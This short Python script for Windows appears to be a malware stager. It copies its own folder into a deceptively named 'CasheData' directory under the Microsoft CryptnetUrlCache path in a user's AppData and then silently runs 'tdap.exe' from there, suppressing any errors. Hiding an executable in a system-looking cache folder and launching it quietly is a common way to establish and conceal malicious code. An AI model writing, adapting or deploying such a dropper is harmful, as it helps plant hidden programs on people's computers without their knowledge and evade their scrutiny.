from subprocess import check_output as system
from os import system as cmd

currentLocation = system('cd', shell = True).decode('utf-8').strip()
location = "C:\\Users\\darks\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache"

if currentLocation != location:
    cmd(f"mkdir {location}\\CasheData")

    cmd(f"Xcopy /E {currentLocation} {location}\\CasheData")

try:
    cmd(f"{location}\\CasheData\\tdap\\tdap.exe")
except:
    pass